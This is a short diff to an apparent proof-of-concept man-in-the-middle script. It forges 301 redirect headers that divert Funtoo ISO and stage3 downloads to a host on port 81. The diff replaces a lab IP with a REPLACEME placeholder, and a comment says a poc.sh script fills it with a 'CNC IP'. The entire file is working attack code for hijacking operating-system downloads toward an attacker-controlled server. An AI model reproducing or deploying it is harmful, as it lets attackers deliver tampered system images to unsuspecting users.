@@ -1,16 +1,18 @@
 """
 301 redirect iso and stage3 downloads
+poc.sh should replace REPLACEME with user specified CNC IP
+TODO fix the need to use ports other than 80 (81 in this case)
 """
 from netlib.http import Headers
 import re
 
 h_funtoo_iso = Headers([
-    [b"Location",b"http://172.16.10.250:81/systemrescuecd-x86-4.7.1.iso"],
+    [b"Location",b"http://REPLACEME:81/systemrescuecd-x86-4.7.1.iso"],
     [b"Content-Type",b"application/x-iso9660-image"]    
 ])
 
 h_funtoo_stage3 = Headers([
-    [b"Location",b"http://172.16.10.250:81/stage3-latest.tar.xz"],
+    [b"Location",b"http://REPLACEME:81/stage3-latest.tar.xz"],
     [b"Content-Type",b"application/octet-stream"]    
 ])
 
